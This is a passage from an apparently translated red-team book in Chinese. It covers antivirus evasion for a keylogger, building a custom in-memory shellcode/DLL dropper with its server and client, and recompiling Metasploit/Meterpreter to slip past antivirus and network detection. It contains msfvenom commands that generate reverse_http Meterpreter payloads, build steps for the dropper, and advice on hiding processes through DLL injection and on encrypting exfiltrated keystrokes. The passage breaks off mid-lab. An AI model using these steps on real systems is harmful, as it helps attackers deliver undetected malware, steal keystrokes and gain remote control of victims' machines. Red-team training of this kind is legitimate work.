        int symbol = string[n];
        int e_symbol = symbol - key;
        result[n] = e_symbol;
    }
    result[len] = '\0';
    return 0;
}
另一种规避杀毒软件的方法是使用函数指针调用User32.dll中的函数，而不是直接调用函数。为此，首先编写函数定义，然后使用Windows GetProcAddress函数找到要调用的函数的地址，最后，将函数定义指针指定给从GetProcAddress接收的地址。可以在CitHub找到如何使用函数指针调用SetWindowsHookEx函数的示例。
该程序的第3个版本将前一个示例中的字符串加密与使用指针调用函数的方法相结合。有趣的是，如果您将已编译的二进制文件提交到VirusTotal，那么看不到User32.dll。在图7.1中，左侧图像显示的是版本1，右侧图像显示的是带有指针调用的版本3。
图7.1
为了查看您是否已成功规避杀毒软件，最好的选择是始终在实际运行的杀毒软件系统中进行测试。在实际的行动中，我不建议使用VirusTotal，因为您的样本可能会被发送给不同的安全厂商。但是VirusTotal网站非常适合测试/学习。
实验
您的最终目标是什么？想法是无限的！一点点修复可能是对log.txt内容进行混淆/加密，或者在程序启动后，启动加密套接字，然后将按键内容写入套接字。在接收方，服务器将重建流，写入文件。这将阻止日志数据以纯文本形式显示，就像当前一样，并且可以防止之前的内容写入硬盘。
另一个非常明显的改进是将可执行文件转换为DLL，然后将DLL注入正在运行的进程，使得进程不会显示在任务管理器中。有一些程序可以显示系统上所有当前加载的DLL，因此注入DLL会更加隐蔽。此外，有些程序可以反射性地从内存加载DLL而根本不写入磁盘，从而进一步降低了被取证的风险。
7.3 黑客秘笈定制的放置工具
放置工具是红队工具包的重要组成部分，允许您在被攻击者计算机上植入程序。不在磁盘上放置植入程序是为了降低被发现的风险，并且可以使用多次。在本节中，我们将介绍一个黑客秘笈定制的放置工具，它可以植入shellcode或者是仅驻留在内存中的动态库。
在设计放置工具和相应的服务器时，您需要记住一些事项。放置工具是工具箱中阅后即焚（use-and-burn）的一个工具，这意味着您当前可以正常使用，但是在后续的行动中很可能被检测发现。
为了使后续行动更容易，您需要开发一个标准服务器，可以重复使用。在这个例子中，您将看到一个基本的网络实现框架，它允许为不同的消息注册新的处理程序。这个例子仅包含LOAD_BLOB消息类型的处理程序，您可以轻松添加新的处理程序，从而扩展功能。这就可以提供良好的基础，因为您的所有通信都实现了标准化。
编写放置工具程序或者快速找到目标并进行逆向工程，一个重要的步骤是过滤字符串。当您第一次构建软件时，调试消息非常有用，可以让您不必手动单步调试，查看出现问题的原因。但是，如果调试信息在最终版本中被意外地保留下来，那么软件分析人员将很容易逆向利用您的恶意软件。很多时候，杀毒软件将对独特的字符串或常量值进行签名。举个例子，我使用InfoLog()和ErrorLog()函数，预处理器将在发布版本中编译这些宏。使用这些宏，检查是否定义了_DEBUG，并指示是否包含相关的调用。
7.3.1 shellcode与DLL
在下面的例子中，您可以让放置工具加载完整的DLL或者shellcode。通常有许多公开的植入工具，您可以生成一个完整的DLL，实现DLL下载并且执行。放置工具直接加载DLL，可以使您省略加载更多的API调用，从而保持隐蔽。由于头部信息被修改，因此某些植入工具可能无法正确加载。如果您的一个植入工具不能正常工作，但是包含生成shellcode的方法，那么这应该可以解决您的问题。这是因为定制的加载器，通常可以修复头部信息，并从该DLL加载头部信息。
网络中还有大量的shellcode，如shell-storm这样的网站，保存大量的shellcode，其中一些可能会在您后续的行动中派上用场。
7.3.2 运行服务器
构建服务器其实比较简单。在定制的黑客秘笈 kali镜像中，您需要运行以下命令。
第一次编译。
cd /opt/。
sudo apt-get install build-essential libssl-dev cmake git。
git clone https://github.com/cheetz/thpDropper.git。
cd thpDropper/thpd。
mkdir build。
cd build。
cmake ..。
make。
对于后续编译，您需要进行的步骤如下。
cd /opt/thpd/build。
make。
运行服务器，在编译完成后，您需输入如下内容。
./thpd [path to shellcode/DLL] [loadtype]
表7.1为值所对应的当前适用的加载类型。
表7.1
 0
 shellcode
 发送原始shellcode字节到客户端
 1
 DLL
 发送正常DLL文件，客户端反射注入DLL
虽然静荷（shellcode/DLL）可以来自任何类型的命令和控制工具（Metasploit/Meterpreter、Cobalt Strike等），但我们将在示例中使用Meterpreter静荷。生成静荷的步骤如下。
shellcode静荷。 
msfvenom -a x64 -p windows/x64/meterpreter/reverse_http LHOST= LPORT=  EnableStageEncoding=True -f c
注意，您必须获取msfvenom输出，并得到原始shellcode（删除引号、换行以及任何不是shellcode的内容）。
启动服务器：./thpd ./shellcode.txt 0
DLL静荷。 
msfvenom -a x64 -p windows/x64/meterpreter/reverse_http LHOST= LPORT=  EnableStageEncoding=True -f dll > msf.dll
启动服务器：./thpd ./msf.dll 1
7.3.3 客户端
客户端与服务器的运行方式是相似的，其中客户端为每种消息类型注册处理程序。在启动时，客户端尝试回连服务器，如果无法连接或连接断开了，则重试n次，并发送消息要求加载模块。服务器使用BLOB_PACKET进行响应，客户端通过head->msg字段识别并分发该数据包。所有数据包必须在开始时定义HEAD_PACKET字段，否则网络处理程序将无法识别，从而丢弃数据包。使用BuildPacketAndSend()函数正确设置数据包头部，从而允许另一方解码数据包。
要构建客户端，您需要Visual Studio和Git工具。首先将Git存储库（https://github.com/cheetz/ thpDropper.git）复制到一个文件夹中，然后在Visual Studio中打开thpDropper.sln。确保放置设备的代码设置了正确的体系结构，如果您不需要任何调试消息，那么可设置为发布版本。完成此操作后，按F7键，Visual Studio将为用户生成可执行文件。
7.3.4 配置客户端和服务器
大多数客户端的配置都可以在globals.cpp文件中找到，您需要更改的3个主要配置是主机名、端口和数据包持续时间。每个配置选项旁边都有注释，说明配置项的内容。您不需要更改数据包签名，如果更改数据包签名，那么发送的每个数据包的前两个字节将被修改，用于标识这是服务器上的有效连接。如果您希望对IP地址和端口进行模糊处理，则可以编写代码，在访问IP地址和端口时，对数据进行解密，在二进制文件中仅存储加密版本。
在服务器端的main.cpp文件中，您可以修改服务器监听的端口。此配置是main函数中StartupNetworking()的唯一参数。如果您修改客户端中的数据包签名，则需要修改服务器对应该数据包。这意味着在include/lib/networking.h文件中，PACKET_SIGNATURE值需要与客户端中的全局值匹配。
7.3.5 添加新的处理程序
网络代码库允许您轻松添加新功能。为此，您需要使用客户端的void name()原型函数或服务器上的void name(int conn)原型函数创建一个回调函数。对于各种消息类型，注册一系列的处理程序，在验证数据包头部时，这些处理程序将被调用。在这些函数中，您需要实现从recv缓冲区中读取数据包和数据。您需要调用recv()指针，处理数据包结构和大小。这将获取recv缓冲区相关信息。在这个例子中，您将看到我们在处理程序中读取BLOB_PACKET，存储在packet.payloadLen中的值，表明读取的字节数。同样的方法适用于获取其他数据类型。如果将包含文件路径的字符串发送到被攻击者计算机上的某个文件，数据包中包含一个字段用于描述字符串的长度，该字段随数据包一同发送。
7.3.6 进一步的练习
上面的代码提供开发的基础，您可以通过多种方式自行改进。在传输层上添加加密层非常简单和方便。您可能希望创建自己的send和recv管理器，在调用send和recv函数之前解密/加密。一种非常简单的方法是使用多字节XOR密钥，虽然不是很安全，但是由于改变了您的消息内容，所以不容易被识别。另一个练习可能是扩展LoadBlobHandler()函数，添加新的LOAD_TYPE，如果客户端以管理员身份运行，则会加载已签名的驱动程序。这可以通过使用CreateService()和StartService()windows api调用实现。但是需要记住，加载驱动程序需要文件存储在磁盘上，这将触发文件系统-过滤器驱动程序，捕获该操作。
7.4 重新编译Metasploit/Meterpreter规避杀毒软件和网
络检测 这个话题有些复杂，您很可能在编译过程中遇到一些问题。有很多值得推荐的工具，如Metasploit/Meterpreter，每个杀毒软件和网络入侵检测（NID）工具都对这些工具进行签名。我们可以尝试使用Shikata Ga Nai软件对静荷进行混淆，并通过HTTPS进行混淆，这是目前常用的方式。任何类型的混淆通常都会有一个根签名，可以被发现和检测，杀毒软件在内存特定位置查看特定的字符串，网络设备实施中间人策略对HTTPS通信内容进行检查。那么如何才能持续使用我们选择的工具，同时绕过所有常见的安全防护机制呢？以Metasploit/Meterpreter为例，介绍一下如何绕过所有这些障碍。我们的目标是绕过二进制文件的杀毒软件签名、内存中的杀毒软件签名和网络流量签名。
为了规避所有的检测方法，我们需要做一些事情。首先，修改Meterpreter静荷，确保在网络流量和内存数据中，无法基于签名检测静荷。然后，修改metsvc持久性模块，防止被杀毒软件标识。接着，我们使用Clang编译部分metsrv（实际的Meterpreter静荷），同样防止被杀毒软件标识。最后，编写自己的stage0静荷，下载执行Meterpreter，规避所有的杀毒软件。
使用Clang编译metsrv（Meterpreter的网络服务包装器），删除metsrv/metsvc-server引用。
http://bit.ly/2H2kaUB。
修改静荷，去掉类似于Mimikatz的字符串。
http://bit.ly/2IS9Hvl。
修改反射性DLL注入字符串，删除类似于ReflectiveLoader的字符串。
http://bit.ly/2qyWfFK。
当Meterpreter在网络传输时，许多网络产品检测Meterpreter的0/1/2级加载模块。除了混淆静荷，我们还可以对实际的shellcode进行混淆。一个例子是遍历所有Ruby文件，获取不同的静荷类型，并添加随机nop字符，规避检测。
http：//bit.ly/2JKUhdx。
自定义Stage0静荷。
http：//bit.ly/2ELYkm8。
实验
在本实验中，我们将修改Metasploit/Meterpreter代码，重新编译它，确保可以规避基本的杀毒软件检测。
在开始前，先查看Metasploit的编译环境。
https://github.com/rapid7/metasploit-payloads/tree/master/c/meterpreter。
https://github.com/rapid7/metasploit-framework/wiki/Setting-Up-a-Metasploit- Development- Environment。
Windows的环境设置如下所示。
Visual Studio 2013（VS2013）：Visual Studio社区版即可，另外，需要安装C/C ++编译环境。
在Windows中安装LLVM（32位）（安装Visual Studio之后，确保安装LLVM工具链）：可在LLVM官网下载LLVM 6。
在Windows中安装GNU Make（见SourceForge网站相关网页）：确保安装在系统路径，或者从应用程序安装路径运行。
Git-SCM（见Git官网）。
7.4.1 如何在Windows中构建Metasploit/Meterpreter
首先获取所有cyberspacekitten的存储库。作为原型系统，这些文件在实验室已经做了较大的修改。首先，我们需要下载框架和所有的静荷。
git clone https://github.com/cyberspacekittens/metasploit-framework。
cd metasploit-framework && git submodule init && git submodule update && cd ..。
git clone https://github.com/cyberspacekittens/metasploit-payloads。
cd metasploit-payloads && git submodule init && git submodule update && cd ..。
在存储库中修改字符串，采用Clang编译器进行编译，添加静荷nops，务必查看存储库之间的Metasploit差异，确切了解更改的内容。
编译Metasploit / Meterpreter
我们要做的第一件事，使用更新内容重新编译metsvc和metsvc-server。在Visual Studio 2013中运行其命令提示符，如下所示。
跳转到metsvc修改源代码所在的文件夹。 
cd metasploit-framework\external\source\metsvc\src
使用make编译。 